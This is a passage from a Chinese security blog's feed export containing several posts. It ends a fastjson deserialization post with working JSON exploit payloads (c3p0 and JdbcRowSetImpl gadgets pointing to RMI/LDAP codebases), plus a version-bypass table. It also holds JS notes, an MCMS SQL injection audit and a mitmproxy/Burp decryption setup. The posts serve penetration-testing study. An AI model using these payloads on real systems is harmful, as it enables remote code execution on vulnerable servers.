&quot;val&quot;:&quot;test14.127.0.0.1:1389&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;test15.127.0.0.1:1389&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;test16.127.0.0.1:1389&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;test17.127.0.0.1:1389&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;test18.127.0.0.1:1389&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;test19.127.0.0.1:1389&quot;&#125;:0</span><br><span class="line">&#123;&quot;rand1&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6f74686572302e3132372e302e302e313a313338392f740003466f6f; &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">不出网打法:</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="判断目标fastjson版本"><a href="#判断目标fastjson版本" class="headerlink" title="判断目标fastjson版本"></a>判断目标fastjson版本</h5><p><strong>1.判断是否是其他json</strong></p>
<p>原理：jackson不允许存在不相关的键值，fastjson则是允许的</p>
<p>如原json如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;pageNumber&quot;:1,&quot;pageSize&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>加上一个不相关的键值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;pageNumber&quot;:1,&quot;pageSize&quot;:1,&quot;test&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>jackson就会报错，fastjson则不会，而是和之前一模一样。</p>
<p>如果对方什么都不回显，那就只能dnslog或者时间延迟了。</p>
<p><strong>2.通过报错消息</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;a[&quot;test&quot;:1]</span><br></pre></td></tr></table></figure>

<p><strong>3.无报错信息，判断版本区间</strong></p>
<p>先简单总结一下fastjson的可利用版本。</p>
<p>&lt;1.2.24，没有任何限制。</p>
<p>1.2.24-1.2.47，java.lang.Class绕过。</p>
<p>1.2.48-1.2.68，java.lang.AutoCloseable绕过。</p>
<p>1.2.70-1.2.72，无链版本</p>
<p>1.2.73-1.2.80，java.lang.Exception绕过。</p>
<p>1.2.83，无漏洞版本</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link" href="https://tttang.com/archive/1579/#toc__2">https://tttang.com/archive/1579/#toc__2<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.bilibili.com/video/BV1bD4y117Qh/">https://www.bilibili.com/video/BV1bD4y117Qh/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.cnblogs.com/nice0e3/p/14601670.html">https://www.cnblogs.com/nice0e3/p/14601670.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.anquanke.com/post/id/240446#h3-6">https://www.anquanke.com/post/id/240446#h3-6<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://javasec.org/java-vuls/FastJson.html">https://javasec.org/java-vuls/FastJson.html<i class="fas fa-external-link-alt"></i></a></p>
<p>盲判断目标的fastjson版本：<a class="link" href="https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA">https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA<i class="fas fa-external-link-alt"></i></a></p>
<p>fastjson反序列化漏洞区分版本号的方法总结：<a class="link" href="https://blog.csdn.net/m0_71692682/article/details/125814861">https://blog.csdn.net/m0_71692682/article/details/125814861<i class="fas fa-external-link-alt"></i></a></p>
<p>fastjson 获取精确版本号的方法：<a class="link" href="https://b1ue.cn/archives/402.html">https://b1ue.cn/archives/402.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>JS学习中的细节</title>
    <url>/2020/01/19/JS%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E7%BB%86%E8%8A%82-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12215067.html">源地址：https://www.cnblogs.com/This-is-Y/p/12215067.html<i class="fas fa-external-link-alt"></i></a></p>
<p>————恢复内容开始————</p>
<p>输出</p>
<ul>
<li>document.getElementById(“id_name”).innerHTML=”输出内容”;</li>
</ul>
<p>　　这种是通过找到该id得元素进行修改，达到输出的目的。</p>
<ul>
<li>document.write(“html代码”);</li>
</ul>
<p>　　从内容就可以知道这是直接写一段html代码到当前html文档中</p>
<ul>
<li>console.log(“内容”);</li>
</ul>
<p>　　这是输出到浏览器控制台，前端不可见。按F12到console查看，代码出错的时候，还会有报错信息。</p>
<p>大小写</p>
<ul>
<li>js对大小写严格，getELementById和GETelementbyid是不一样的（写成后面这样子前端不会报错，但是代码不会工作，控制台里会给错误信息）。同样，变量名也如此</li>
</ul>
<p>字符串拼接</p>
<li>字符串用单引号或者双引号包起来，可以使用加号拼接，当字符串与数字用加号拼接时，数字作为字符串处理

<pre>var a = 1;
var b = 3;
var t1 = "python ";
var t2 = "is ";
var t3 = "best ";
document.getElementById("t2").innerHTML=a+b;    //4
document.getElementById("t3").innerHTML=t1+t2+t3;   //python is best
document.getElementById("t4").innerHTML=t1+a+" "+t3;   //python 1 best
……………………

（省略部分代码）

&lt;h1 id = "t2"&gt;javascript_2&lt;/h1&gt;
&lt;h1 id = "t3"&gt;javascript_3&lt;/h1&gt;
&lt;h1 id = "t4"&gt;javascript_4&lt;/h1&gt;</pre>

</li>

<p> </p>
<p>关键字：</p>
<ul>
<li>定义变量 ：var</li>
<li>其他都大同小异，for ，for in ，switch，throw，break，continue，什么什么的</li>
</ul>
<p>空格：</p>
<p>　　可以和python一样，随意加入空格，如a=b+c;与a = b + c ;的效果是一样的</p>
<p>折行：</p>
<ul>
<li>可以在文本字符串中使用反斜杠对代码行进行换行。如：</li>
</ul>
<p>　　不过，不能像这样折行：</p>
<p>未申明：</p>
<li>当一个变量只定义不申明时，值为undefined，如

<pre>var empty;
document.getElementById("t5").innerHTML=empty;     //undefined</pre>

<p> </p>
</li>
<li>当一个变量多次申明时，取最新的，如

<pre>var muti="123";
var muti="456"
document.getElementById("t6").innerHTML=muti;   //456</pre>

<p>但是如果未声明，则不影响</p>
<pre>var muti="123";
var muti;
document.getElementById("t6").innerHTML=muti;   //123</pre>

</li>

<p> 关于this：</p>
<li>js中也有类似于java中的this，食用方法如下

<pre>&lt;button  onclick="this.innerHTML=Date()"&gt;获取当前时间&lt;/button&gt;</pre>

<p> </p>
</li>

<p>if语句：</p>
<li>使用**variablename**=(**condition**)?**value1**:**value2** 来缩短代码量，使用如下

<pre>voteable=(age&lt;18)?"年龄太小":"年龄已达到";</pre>

</li>
<li>可以只有if，不接else。如

<pre>if (time&lt;20)
{
    x="Good day";
}</pre>

</li>
- js也有else if
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>MCMS代码审计笔记</title>
    <url>/2023/12/04/MCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>官网：<a class="link" href="https://www.mingsoft.net/">https://www.mingsoft.net/<i class="fas fa-external-link-alt"></i></a></p>
<p>gitub：<a class="link" href="https://github.com/ming-soft/mcms">https://github.com/ming-soft/mcms<i class="fas fa-external-link-alt"></i></a></p>
<p>gitee：<a class="link" href="https://gitee.com/mingSoft/MCMS">https://gitee.com/mingSoft/MCMS<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li><p>IDEA 2023.2</p>
</li>
<li><p>java 1.8.151 openjdk</p>
</li>
<li><p>ubuntu 22.04</p>
</li>
<li><p>mysql 5.7.31</p>
</li>
<li><p>系统版本：5.3.5</p>
</li>
</ul>
<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>官方很贴心，直接照着readme.md文档的<strong>快速体验</strong>配置，加载完pom.xml文件后选择MSApplicaion.java,点击右上角运行即可。</p>
<h2 id="系统结构"><a href="#系统结构" class="headerlink" title="系统结构"></a>系统结构</h2><p>从github上把项目下载解压后就发现有点不对劲，这样一个系统，也不算小，src中代码只有这么一点，怎么想都不对劲。</p>
<p><img src="image-20231204173119372.png" alt="image-20231204173119372"></p>
<p>但是把pom.xml文件都下载好后运行又一切正常。花了一点时间研究了一下。才发现这个系统把几乎所有的功能都打包成jar文件，写在pom文件中，由maven导入系统中了。</p>
<p><img src="image-20231204173423414.png" alt="image-20231204173423414"><img src="image-20231204173600046.png" alt="image-20231204173600046"></p>
<p><img src="image-20231204173500872.png" alt="image-20231204173500872"></p>
<p>所以下断点需要在这些文件中，另外一方面，由于系统使用的mybatis，由于这种特殊的结构，我没找到系统的resources/mapper/xxxxMapper.xml文件，又是经过一段时间，我发现这些xml文件，居然tmd直接就在dao目录下</p>
<p><img src="image-20231204174502834.png" alt="image-20231204174502834"></p>
<p>提取这些源代码可以在idea中点进jar文件中的代码文件，然后点击编辑框上面的下载源代码下载xxxx-source.jar文件。用xxxx-source.jar文件反编译的代码是有注释的，xxxx.jar没有。对比如图：</p>
<p><img src="image-20231205092338029.png" alt="image-20231205092338029"></p>
<p><img src="image-20231205092419613.png" alt="image-20231205092419613"></p>
<p>把所有6个jar文件都解压到项目目录中，现在ideal查询就能查到xml文件中的内容了。</p>
<p><img src="image-20231205092710851.png" alt="image-20231205092710851"></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>在 /net/mingsoft/ms-base/2.1.25/ms-base-2.1.25-sources.jar!/net/mingsoft/base/util/SqlInjectionUtil.java 中存在sql注入的过滤函数</p>
<p><img src="image-20231205101156500.png" alt="image-20231205101156500"></p>
<p>在/net/mingsoft/ms-basic/2.1.25/ms-basic-2.1.25.jar!/net/mingsoft/basic/filter中有一系列防御函数</p>
<p><img src="image-20231205153828189.png" alt="image-20231205153828189"></p>
<p><img src="image-20231205153920727.png" alt="image-20231205153920727"></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="IContentDao-xml"><a href="#IContentDao-xml" class="headerlink" title="IContentDao.xml"></a>IContentDao.xml</h2><p>在IContentDao.xml中有6处<code>$&#123;</code> ，如图：</p>
<p><img src="image-20231205101411978.png" alt="image-20231205101411978"></p>
<p>一个一个来看。</p>
<p>前面两个${order}不行，两个order都跳到了queryIdsByCategoryIdForParser方法中，入参为contentBean，第一个contentBean没有setorder，第二个设置了，但是写死了</p>
<p><img src="image-20240227173350589.png" alt="image-20240227173350589"></p>
<p><img src="image-20240227173318810.png" alt="image-20240227173318810"></p>
<h3 id="queryIdsByCategoryIdForParser"><a href="#queryIdsByCategoryIdForParser" class="headerlink" title="queryIdsByCategoryIdForParser"></a>queryIdsByCategoryIdForParser</h3><p>在最后的order，往回找IContentDao.java，有queryIdsByCategoryIdForParser函数，继续往回找，跳到ContentBizImpl.java中，也有queryIdsByCategoryIdForParser。有两个使用。在GeneraterAction.java文件中。一个是生成栏目接口，”/{categoryId}/generateColumn”，一个是生成文章接口，”/{columnId}/generateArticle”。</p>
<p><img src="image-20231205102645222.png" alt="image-20231205102645222"></p>
<p><img src="image-20231205102607540.png"></p>
<p>由于注入需要order参数，两个函数的调用，传入的contentean都没有set order参数。无法利用</p>
<h3 id="queryIdsByCategoryIdForParserAndNotCover"><a href="#queryIdsByCategoryIdForParserAndNotCover" class="headerlink" title="queryIdsByCategoryIdForParserAndNotCover"></a>queryIdsByCategoryIdForParserAndNotCover</h3><p>在最后的order，往回找IContentDao.java，有queryIdsByCategoryIdForParserAndNotCover函数。继续往回找，跳到ContentBizImpl.java中，也有queryIdsByCategoryIdForParserAndNotCover，但是就到此为止了。这个函数没有在别的地方用过。</p>
<p><img src="image-20231205102125074.png" alt="image-20231205102125074"></p>
<h3 id="getSearchCount"><a href="#getSearchCount" class="headerlink" title="getSearchCount"></a>getSearchCount</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;tableName!=null and tableName!=&#x27;&#x27; and diyList!=null&quot;</span>&gt;</span>left join $&#123;tableName&#125; d on d.link_id=a.id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">foreach</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span> <span class="attr">collection</span>=<span class="string">&quot;categoryIds.split(&#x27;,&#x27;)&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;or&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">    a.category_id=$&#123;item&#125;</span><br><span class="line">    or a.category_id in (select id FROM cms_category where cms_category.del=0</span><br><span class="line">    and FIND_IN_SET($&#123;item&#125;,CATEGORY_PARENT_IDS) &gt; 0)</span><br><span class="line"><span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">foreach</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span> <span class="attr">collection</span>=<span class="string">&quot;diyList&quot;</span> <span class="attr">open</span>=<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">separator</span>=<span class="string">&quot;&quot;</span> <span class="attr">close</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    and d.$&#123;item.key&#125; like CONCAT(CONCAT(&#x27;%&#x27;,#&#123;item.value&#125;),&#x27;%&#x27;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样的方法，找到ContentBizImpl.java文件中的getSearchCount函数。</p>
<p><img src="image-20231205105815307.png" alt="image-20231205105815307"></p>
<p>然后是MCmsAction.java文件，</p>
<p><img src="image-20231205111107145.png" alt="image-20231205111107145"></p>
<p>传入四个参数，三个都有<code>$&#123;</code>一个一个来，</p>
<ul>
<li>contentModel</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">contentModel = (ModelEntity) modelBiz.getById(column.getMdiyModelId());</span><br></pre></td></tr></table></figure>

<ul>
<li>fieldValueList</li>
</ul>
<ul>
<li>categoryIds</li>
</ul>
<p>这个参数比较简单，直接在post的body加上categoryIds=123就过来了。但是由于系统有全局过滤，所以需要考虑绕过过滤的问题。</p>
]]></content>
  </entry>
  <entry>
    <title>MITM&amp;BurpSuite做加解密</title>
    <url>/2024/07/25/MITM-BurpSuite%E5%81%9A%E5%8A%A0%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>先创建一个加解密的环境，这里我用python的flask搭建</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">from flask import Flask, request, jsonify, render_template_string</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def index():</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        if request.is_json:</span><br><span class="line">            postData &#x3D; request.get_json()</span><br><span class="line">            print(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line">            print(&quot;服务端最终接受到的请求:&quot;,json.dumps(postData,ensure_ascii&#x3D;False))</span><br><span class="line">            if &#39;encodedData&#39; in postData:</span><br><span class="line">                encodedData &#x3D; postData[&#39;encodedData&#39;]</span><br><span class="line"></span><br><span class="line">                if encodedData.endswith(&#39;&#x3D;&#39;):</span><br><span class="line">                    decodedData &#x3D; base64.b64decode(encodedData).decode()</span><br><span class="line">                    decodedData &#x3D; base64.b64encode(decodedData.encode()).decode()</span><br><span class="line">                else:</span><br><span class="line">                    decodedData &#x3D; base64.b64encode(encodedData.encode()).decode()</span><br><span class="line"></span><br><span class="line">                response &#x3D; &#123;&#39;reencodedData&#39;: decodedData&#125;</span><br><span class="line">                print(&quot;服务端最终返回的请求:&quot;,json.dumps(response,ensure_ascii&#x3D;False))</span><br><span class="line">                return jsonify(response)</span><br><span class="line">            else:</span><br><span class="line">                errorResponse &#x3D; &#123;&#39;error&#39;: &#39;Invalid data received&#39;&#125;</span><br><span class="line">                return jsonify(errorResponse), 400</span><br><span class="line">        else:</span><br><span class="line">            return jsonify(&#123;&#39;error&#39;: &#39;Request must be in JSON format&#39;&#125;), 400</span><br><span class="line"></span><br><span class="line">    return render_template_string(&#39;&#39;&#39;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Base64编码示例&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form id&#x3D;&quot;myForm&quot;&gt;</span><br><span class="line">        &lt;label for&#x3D;&quot;userInput&quot;&gt;输入文本：&lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;userInput&quot; name&#x3D;&quot;userInput&quot; required&gt;</span><br><span class="line">        &lt;button type&#x3D;&quot;button&quot; onclick&#x3D;&quot;encodeAndSend()&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 添加用于显示服务端返回的数据的元素 --&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;responseDataContainer&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function encodeAndSend() &#123;</span><br><span class="line">            var userInput &#x3D; document.getElementById(&quot;userInput&quot;).value;</span><br><span class="line">            var encodedData &#x3D; btoa(userInput);</span><br><span class="line"></span><br><span class="line">            var jsonData &#x3D; &#123;</span><br><span class="line">                encodedData: encodedData</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            fetch(&#39;&#x2F;&#39;, &#123;</span><br><span class="line">                method: &#39;POST&#39;,</span><br><span class="line">                headers: &#123;</span><br><span class="line">                    &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;</span><br><span class="line">                &#125;,</span><br><span class="line">                body: JSON.stringify(jsonData)</span><br><span class="line">            &#125;)</span><br><span class="line">            .then(response &#x3D;&gt; response.json())</span><br><span class="line">            .then(data &#x3D;&gt; &#123;</span><br><span class="line">                var responseDataContainer &#x3D; document.getElementById(&quot;responseDataContainer&quot;);</span><br><span class="line">                responseDataContainer.innerHTML &#x3D; &#39;服务端返回的数据： &#39; + JSON.stringify(data);</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(error &#x3D;&gt; &#123;</span><br><span class="line">                console.error(&#39;Error:&#39;, error);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&#39;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;&quot;8081&quot;,debug&#x3D;True)</span><br></pre></td></tr></table></figure>

<p>运行，抓包如下：</p>
<p><img src="image-20240725110511241-1721907265733-5.png" alt="image-20240725110511241"></p>
<h2 id="MITM脚本"><a href="#MITM脚本" class="headerlink" title="MITM脚本"></a>MITM脚本</h2><p>整体流程大概如此，需要运行两个MITM脚本，分别处理上游代理和下游代理</p>
<p><img src="image-20240725151939367-1721907091291-1.png" alt="image-20240725151939367"></p>
<p>这里我设置</p>
<p>MITM下游代理为：127.0.0.1:7070</p>
<p>bp代理代理为：127.0.0.1:8080</p>
<p>MITM上游代理为：127.0.0.1:9090</p>
<p>下游代理脚本：MITM-downstream.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from mitmproxy import flowfilter,ctx</span><br><span class="line">from mitmproxy.http import HTTPFlow</span><br><span class="line">from mitmproxy import flowfilter</span><br><span class="line">from mitmproxy.http import HTTPFlow</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class Mimit():</span><br><span class="line">    def request(self,flow):</span><br><span class="line">        print(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;处理下游请求&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line">        # 获取请求头 header</span><br><span class="line">        req_header &#x3D; flow.request.headers</span><br><span class="line">        ctx.log.info(req_header)</span><br><span class="line"></span><br><span class="line">        # 获取请求体 body</span><br><span class="line">        req &#x3D; flow.request.get_text()</span><br><span class="line">        ctx.log.info(req)</span><br><span class="line"></span><br><span class="line">        # 修改请求头</span><br><span class="line">        req_json &#x3D; json.loads(req)</span><br><span class="line">        req_json[&#39;new-down&#39;] &#x3D; &quot;下游请求&quot;</span><br><span class="line">        ctx.log.info(req_json)</span><br><span class="line">        # 处理json.dumps中文问题 ensure_ascii&#x3D;False</span><br><span class="line">        new_req_str &#x3D; json.dumps(req_json,ensure_ascii&#x3D;False)</span><br><span class="line">        ctx.log.info(new_req_str)</span><br><span class="line"></span><br><span class="line">        # 设置修改过后的请求体</span><br><span class="line">        flow.request.set_text(new_req_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def response(self,flow):</span><br><span class="line">        print(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;处理下游响应&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line"></span><br><span class="line">        # 获取请求头 header</span><br><span class="line">        rep_header &#x3D; flow.response.headers</span><br><span class="line">        ctx.log.info(rep_header)</span><br><span class="line"></span><br><span class="line">        # 获取请求体 body</span><br><span class="line">        rep &#x3D; flow.response.get_text()</span><br><span class="line">        ctx.log.info(rep)</span><br><span class="line"></span><br><span class="line">        # 修改请求头</span><br><span class="line">        rep_json &#x3D; json.loads(rep)</span><br><span class="line">        rep_json[&#39;new-down&#39;] &#x3D; &quot;下游响应&quot;</span><br><span class="line">        ctx.log.info(rep_json)</span><br><span class="line">        # 处理json.dumps中文问题 ensure_ascii&#x3D;False</span><br><span class="line">        new_rep_str &#x3D; json.dumps(rep_json,ensure_ascii&#x3D;False)</span><br><span class="line">        ctx.log.info(new_rep_str)</span><br><span class="line"></span><br><span class="line">        # 设置修改过后的请求体</span><br><span class="line">        flow.response.set_text(new_rep_str)</span><br><span class="line"></span><br><span class="line">addons &#x3D; [Mimit(),]</span><br></pre></td></tr></table></figure>

<p>执行命令：mitmdump -p 7070 -s MITM-downstream.py  –mode upstream:<a class="link" href="http://127.0.0.1:8080/">http://127.0.0.1:8080<i class="fas fa-external-link-alt"></i></a> –ssl-insecure</p>
<p>然后bp中设置bp的上游代理：</p>
<p><img src="image-20240725174733794-1721907254684-3.png" alt="image-20240725174733794"></p>
<p>上游代理脚本：MITM-upstream.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from mitmproxy import flowfilter,ctx</span><br><span class="line">from mitmproxy.http import HTTPFlow</span><br><span class="line">from mitmproxy import flowfilter</span><br><span class="line">from mitmproxy.http import HTTPFlow</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">class Mimit():</span><br><span class="line">    def request(self,flow):</span><br><span class="line">        print(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;处理上游请求&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line">        # 获取请求头 header</span><br><span class="line">        req_header &#x3D; flow.request.headers</span><br><span class="line">        ctx.log.info(req_header)</span><br><span class="line"></span><br><span class="line">        # 获取请求体 body</span><br><span class="line">        req &#x3D; flow.request.get_text()</span><br><span class="line">        ctx.log.info(req)</span><br><span class="line"></span><br><span class="line">        # 修改请求头</span><br><span class="line">        req_json &#x3D; json.loads(req)</span><br><span class="line">        req_json[&#39;new-up&#39;] &#x3D; &quot;上游请求&quot;</span><br><span class="line">        ctx.log.info(req_json)</span><br><span class="line">        # 处理json.dumps中文问题 ensure_ascii&#x3D;False</span><br><span class="line">        new_req_str &#x3D; json.dumps(req_json,ensure_ascii&#x3D;False)</span><br><span class="line">        ctx.log.info(new_req_str)</span><br><span class="line"></span><br><span class="line">        # 设置修改过后的请求体 </span><br><span class="line">        flow.request.set_text(new_req_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def response(self,flow):</span><br><span class="line">        print(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;处理上游响应&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line"></span><br><span class="line">        # 获取请求头 header</span><br><span class="line">        rep_header &#x3D; flow.response.headers</span><br><span class="line">        ctx.log.info(rep_header)</span><br><span class="line"></span><br><span class="line">        # 获取请求体 body</span><br><span class="line">        rep &#x3D; flow.response.get_text()</span><br><span class="line">        ctx.log.info(rep)</span><br><span class="line"></span><br><span class="line">        # 修改请求头</span><br><span class="line">        rep_json &#x3D; json.loads(rep)</span><br><span class="line">        rep_json[&#39;new-up&#39;] &#x3D; &quot;上游响应&quot;</span><br><span class="line">        ctx.log.info(rep_json)</span><br><span class="line">        # 处理json.dumps中文问题 ensure_ascii&#x3D;False</span><br><span class="line">        new_rep_str &#x3D; json.dumps(rep_json,ensure_ascii&#x3D;False)</span><br><span class="line">        ctx.log.info(new_rep_str)</span><br><span class="line"></span><br><span class="line">        # 设置修改过后的请求体</span><br><span class="line">        flow.response.set_text(new_rep_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addons &#x3D; [Mimit(),]</span><br></pre></td></tr></table></figure>

<p>执行命令：mitmdump -p 9090 -s MITM-upstream.py –ssl-insecure</p>
<p>最后的执行效果如下：</p>
<p>浏览器默认效果：</p>
<p><img src="image-20240727181854912.png" alt="image-20240727181854912"></p>
<p>开启MITM加解密后：</p>
<p><img src="image-20240727181914354.png" alt="image-20240727181914354"></p>
<p>而服务器接受的数据以及MITM两层代理中的数据为：</p>
<p><img src="image-20240727182413636.png" alt="image-20240727182413636"></p>
